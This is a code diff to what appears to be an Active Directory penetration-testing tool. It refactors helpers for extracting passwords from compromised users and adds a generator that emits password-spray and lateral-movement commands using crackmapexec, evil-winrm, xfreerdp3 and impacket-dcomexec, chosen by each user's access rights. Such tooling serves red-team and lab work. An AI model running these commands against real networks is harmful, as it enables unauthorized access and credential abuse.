@@ -83,6 +83,61 @@ class Colors:
     RESET = '\033[0m'
 
 
+# =============================================================================
+# SHARED HELPERS - Used by multiple spray/display functions
+# =============================================================================
+
+def extract_creds_from_pwned_users(pwned_users: List) -> tuple:
+    """
+    Extract passwords and usernames from PwnedUser objects.
+
+    Args:
+        pwned_users: List of PwnedUser objects with credentials
+
+    Returns:
+        Tuple of (passwords: List[str], usernames: List[str])
+    """
+    passwords = []
+    usernames = []
+    for user in pwned_users or []:
+        usernames.append(user.username)
+        for ctype, cval in zip(user.cred_types, user.cred_values):
+            if ctype == "password" and cval:
+                passwords.append(cval)
+    return passwords, usernames
+
+
+def fill_spray_template(
+    cmd: str,
+    dc_ip: str,
+    domain: str,
+    password: str = "<PASSWORD>",
+    usernames: List[str] = None,
+) -> str:
+    """
+    Fill placeholders in a spray command template.
+
+    Args:
+        cmd: Command template with placeholders
+        dc_ip: Domain Controller IP
+        domain: Domain name
+        password: Password to fill
+        usernames: List of usernames (first one used for <USERNAME>)
+
+    Returns:
+        Command with placeholders replaced
+    """
+    result = cmd
+    result = result.replace("<DC_IP>", dc_ip)
+    result = result.replace("<DOMAIN>", domain.lower() if domain else "<DOMAIN>")
+    result = result.replace("<PASSWORD>", password)
+    result = result.replace("<USER_FILE>", "users.txt")
+    result = result.replace("<PASSWORD_FILE>", "passwords.txt")
+    if usernames:
+        result = result.replace("<USERNAME>", usernames[0])
+    return result
+
+
 def print_command_tables(
     tables: List[CommandTable],
     use_colors: bool = True,
@@ -2002,13 +2057,7 @@ def print_spray_recommendations(
     pwned_users = pwned_users or []
 
     # Extract credentials from pwned users
-    passwords = []
-    usernames = []
-    for user in pwned_users:
-        usernames.append(user.username)
-        for ctype, cval in zip(user.cred_types, user.cred_values):
-            if ctype == "password" and cval:
-                passwords.append(cval)
+    passwords, usernames = extract_creds_from_pwned_users(pwned_users)
 
     # =========================================================================
     # HEADER
@@ -2049,17 +2098,9 @@ def print_spray_recommendations(
         print(f"    Attempts per round:  {c.BOLD}2{c.RESET}")
         print(f"    Delay between:       {c.BOLD}30 minutes{c.RESET}")
 
-    # Helper to fill command template
+    # Local wrapper for fill_spray_template with captured context
     def fill_template(cmd: str, pwd: str = "<PASSWORD>") -> str:
-        result = cmd
-        result = result.replace("<DC_IP>", dc_ip)
-        result = result.replace("<DOMAIN>", domain.lower() if domain else "<DOMAIN>")
-        result = result.replace("<PASSWORD>", pwd)
-        result = result.replace("<USER_FILE>", "users.txt")
-        result = result.replace("<PASSWORD_FILE>", "passwords.txt")
-        if usernames:
-            result = result.replace("<USERNAME>", usernames[0])
-        return result
+        return fill_spray_template(cmd, dc_ip, domain, pwd, usernames)
 
     # =========================================================================
     # METHOD 1: SMB-BASED
@@ -2411,13 +2452,7 @@ def generate_spray_section(
     pwned_users = pwned_users or []
 
     # Extract credentials from pwned users
-    passwords = []
-    usernames = []
-    for user in pwned_users:
-        usernames.append(user.username)
-        for ctype, cval in zip(user.cred_types, user.cred_values):
-            if ctype == "password" and cval:
-                passwords.append(cval)
+    passwords, usernames = extract_creds_from_pwned_users(pwned_users)
 
     # Only show section if we have passwords to spray with
     if not passwords:
@@ -2426,17 +2461,9 @@ def generate_spray_section(
     console_lines = []
     markdown_lines = []
 
-    # Helper to fill command template
+    # Local wrapper for fill_spray_template with captured context
     def fill_template(cmd: str, pwd: str = "<PASSWORD>") -> str:
-        result = cmd
-        result = result.replace("<DC_IP>", dc_ip)
-        result = result.replace("<DOMAIN>", domain.lower() if domain else "<DOMAIN>")
-        result = result.replace("<PASSWORD>", pwd)
-        result = result.replace("<USER_FILE>", "users.txt")
-        result = result.replace("<PASSWORD_FILE>", "passwords.txt")
-        if usernames:
-            result = result.replace("<USERNAME>", usernames[0])
-        return result
+        return fill_spray_template(cmd, dc_ip, domain, pwd, usernames)
 
     # =========================================================================
     # HEADER
@@ -2871,6 +2898,27 @@ ACCESS_TYPE_PROTOCOLS = {
     },
 }
 
+# Monolithic spray: Priority order and protocol-specific commands
+# Each user sprayed once on their highest-privilege target
+ACCESS_PRIORITY = ["AdminTo", "CanPSRemote", "CanRDP", "ExecuteDCOM", "ReadLAPSPassword"]
+
+MONOLITHIC_PROTOCOLS = {
+    # access_type: (tool_name, command_template)
+    "AdminTo": ("crackmapexec smb", 'crackmapexec smb {target} -u {user} -p "$PASSWORD"'),
+    "CanPSRemote": ("evil-winrm", 'evil-winrm -i {target} -u {user} -p "$PASSWORD"'),
+    "CanRDP": ("xfreerdp3", 'xfreerdp3 /v:{target} /u:{user} /p:"$PASSWORD" /cert:ignore'),
+    "ExecuteDCOM": ("dcomexec", "impacket-dcomexec '{domain}/{user}:$PASSWORD'@{target}"),
+    "ReadLAPSPassword": ("crackmapexec ldap", 'crackmapexec ldap {target} -u {user} -p "$PASSWORD" -M laps'),
+}
+
+EDGE_DESCRIPTIONS = {
+    "AdminTo": "local admin → SMB auth",
+    "CanPSRemote": "WinRM → evil-winrm auth",
+    "CanRDP": "RDP → xfreerdp3 auth",
+    "ExecuteDCOM": "DCOM → dcomexec auth",
+    "ReadLAPSPassword": "LAPS read → ldap query",
+}
+
 
 def _extract_username(upn: str) -> str:
     """Extract username from UPN format (USER@DOMAIN.COM -> user)."""
@@ -2884,6 +2932,55 @@ def _extract_domain(upn: str) -> str:
     if "@" in upn:
         return upn.split("@")[1]
     return ""
+
+
+def _extract_short_hostname(fqdn: str) -> str:
+    """Extract short hostname from FQDN (CLIENT74.CORP.COM -> CLIENT74)."""
+    if "." in fqdn:
+        return fqdn.split(".")[0]
+    return fqdn
+
+
+def _select_best_target_for_user(user_access: dict) -> dict:
+    """
+    Select the best target for a user based on access type priority.
+
+    Args:
+        user_access: {access_type: [(computer, ip, inherited_from), ...]}
+
+    Returns:
+        {
+            "access_type": str,
+            "computer": str,
+            "ip": str or None,
+            "inherited_from": str or None,
+            "had_rdp_but_skipped": bool  # True if user had RDP but we chose better
+        }
+    """
+    had_rdp = "CanRDP" in user_access
+    non_rdp_types = [t for t in user_access.keys() if t != "CanRDP"]
+    had_better_than_rdp = len(non_rdp_types) > 0
+
+    # Check each access type in priority order
+    for access_type in ACCESS_PRIORITY:
+        # Skip CanRDP if user has any other access type
+        if access_type == "CanRDP" and had_better_than_rdp:
+            continue
+
+        if access_type in user_access and user_access[access_type]:
+            # Get targets for this access type, pick first alphabetically
+            targets = sorted(user_access[access_type], key=lambda x: x[0])
+            computer, ip, inherited_from = targets[0]
+
+            return {
+                "access_type": access_type,
+                "computer": computer,
+                "ip": ip,
+                "inherited_from": inherited_from,
+                "had_rdp_but_skipped": had_rdp and had_better_than_rdp and access_type != "CanRDP",
+            }
+
+    return None
 
 
 def _group_by_common_targets(user_targets: dict, access_type: str) -> list:
@@ -2935,6 +3032,172 @@ def _group_by_common_targets(user_targets: dict, access_type: str) -> list:
     groups.sort(key=lambda g: (-len(g["targets"]), -len(g["users"])))
 
     return groups
+
+
+def _generate_monolithic_spray(
+    access_data: list,
+    domain: str = "",
+    use_colors: bool = True,
+) -> tuple:
+    """
+    Generate monolithic spray commands - one attempt per user on their best target.
+
+    Args:
+        access_data: List from get_all_users_with_access() with inherited_from field
+        domain: Domain name for command templates
+        use_colors: Enable ANSI colors
+
+    Returns:
+        Tuple of (console_lines, markdown_lines)
+    """
+    c = Colors if use_colors else _NoColors
+
+    console_lines = []
+    markdown_lines = []
+
+    if not access_data:
+        return [], []
+
+    # Phase 1: Build user -> access_type -> [(computer, ip, inherited_from)] mapping
+    user_all_access = {}
+    for entry in access_data:
+        user = _extract_username(entry["user"])
+        computer = entry["computer"]
+        access_type = entry["access_type"]
+        ip = entry.get("ip")
+        inherited_from = entry.get("inherited_from")
+
+        if user not in user_all_access:
+            user_all_access[user] = {}
+        if access_type not in user_all_access[user]:
+            user_all_access[user][access_type] = []
+        user_all_access[user][access_type].append((computer, ip, inherited_from))
+
+    # Phase 2: Select best target for each user
+    user_selections = {}
+    edge_counts = {at: 0 for at in ACCESS_PRIORITY}
+    rdp_avoided_count = 0
+
+    for user, access_dict in user_all_access.items():
+        selection = _select_best_target_for_user(access_dict)
+        if selection:
+            user_selections[user] = selection
+            edge_counts[selection["access_type"]] += 1
+            if selection["had_rdp_but_skipped"]:
+                rdp_avoided_count += 1
+
+    if not user_selections:
+        return [], []
+
+    # Phase 3: Generate header and edge selection logic
+    console_lines.append("")
+    console_lines.append(f"  {c.CYAN}{c.BOLD}{'='*74}{c.RESET}")
+    console_lines.append(f"  {c.BOLD}MONOLITHIC SPRAY{c.RESET}")
+    console_lines.append(f"  {c.DIM}One attempt per user on their best target - set password once{c.RESET}")
+    console_lines.append(f"  {c.CYAN}{'='*74}{c.RESET}")
+
+    markdown_lines.append("## Monolithic Spray")
+    markdown_lines.append("")
+    markdown_lines.append("One attempt per user on their best target. Set `PASSWORD` once at the top.")
+    markdown_lines.append("")
+
+    # Edge Selection Logic block
+    console_lines.append("")
+    console_lines.append(f"  {c.YELLOW}{c.BOLD}EDGE SELECTION LOGIC (this report):{c.RESET}")
+    console_lines.append(f"  {c.DIM}{'-'*40}{c.RESET}")
+
+    markdown_lines.append("### Edge Selection Logic")
+    markdown_lines.append("")
+    markdown_lines.append("```")
+
+    for access_type in ACCESS_PRIORITY:
+        count = edge_counts[access_type]
+        if count > 0 or access_type == "CanRDP":
+            desc = EDGE_DESCRIPTIONS.get(access_type, access_type)
+            user_word = "user" if count == 1 else "users"
+
+            if access_type == "CanRDP" and rdp_avoided_count > 0:
+                line = f"  {count} {user_word} via {access_type} ({desc}) - {rdp_avoided_count} avoided (had better options)"
+            else:
+                line = f"  {count} {user_word} via {access_type} ({desc})"
+
+            console_lines.append(f"  {c.DIM}{line}{c.RESET}")
+            markdown_lines.append(line)
+
+    console_lines.append(f"  {c.DIM}  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword{c.RESET}")
+    console_lines.append(f"  {c.DIM}  Each user sprayed exactly once on their highest-privilege target{c.RESET}")
+
+    markdown_lines.append("  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword")
+    markdown_lines.append("  Each user sprayed exactly once on their highest-privilege target")
+    markdown_lines.append("```")
+    markdown_lines.append("")
+
+    # Phase 4: Generate the bash script block
+    console_lines.append("")
+    console_lines.append(f"  {c.BOLD}Copy-paste command block:{c.RESET}")
+    console_lines.append("")
+
+    markdown_lines.append("### Commands")
+    markdown_lines.append("")
+    markdown_lines.append("```bash")
+
+    # PASSWORD variable
+    console_lines.append(f"  {c.GREEN}PASSWORD='<PASSWORD>'{c.RESET}")
+    console_lines.append("")
+    markdown_lines.append("PASSWORD='<PASSWORD>'")
+    markdown_lines.append("")
+
+    # Domain short name for commands
+    domain_short = domain.split(".")[0] if domain else "<DOMAIN>"
+
+    # Generate per-user commands
+    for user in sorted(user_selections.keys()):
+        sel = user_selections[user]
+        access_type = sel["access_type"]
+        computer = sel["computer"]
+        ip = sel["ip"]
+        inherited_from = sel["inherited_from"]
+
+        # Target: prefer IP, fallback to short hostname
+        target = ip if ip else _extract_short_hostname(computer)
+        hostname_short = _extract_short_hostname(computer)
+
+        # Build Cypher-style path comment
+        if inherited_from:
+            inherited_short = _extract_username(inherited_from) if "@" in str(inherited_from) else inherited_from
+            cypher_path = f"MATCH ({user})-[:MemberOf*]->({inherited_short})-[:{access_type}]->({hostname_short})"
+            access_note = f"{access_type} via {inherited_short}"
+        else:
+            cypher_path = f"MATCH ({user})-[:{access_type}]->({hostname_short})"
+            access_note = f"{access_type} (direct)"
+
+        # Get command template
+        tool_name, cmd_template = MONOLITHIC_PROTOCOLS.get(access_type, ("unknown", "# unknown access type"))
+        cmd = cmd_template.format(target=target, user=user, domain=domain_short)
+
+        # Console output
+        console_lines.append(f"  {c.DIM}# --- {user} → {target} ({hostname_short}) ---{c.RESET}")
+        console_lines.append(f"  {c.DIM}# {access_note}: {cypher_path}{c.RESET}")
+
+        # Add note if this user had RDP but we chose better
+        if sel["had_rdp_but_skipped"]:
+            console_lines.append(f"  {c.DIM}# Note: User also has CanRDP, using {access_type} instead{c.RESET}")
+
+        console_lines.append(f"  {c.GREEN}{cmd}{c.RESET}")
+        console_lines.append("")
+
+        # Markdown output
+        markdown_lines.append(f"# --- {user} → {target} ({hostname_short}) ---")
+        markdown_lines.append(f"# {access_note}: {cypher_path}")
+        if sel["had_rdp_but_skipped"]:
+            markdown_lines.append(f"# Note: User also has CanRDP, using {access_type} instead")
+        markdown_lines.append(cmd)
+        markdown_lines.append("")
+
+    markdown_lines.append("```")
+    markdown_lines.append("")
+
+    return console_lines, markdown_lines
 
 
 def print_spray_tailored(
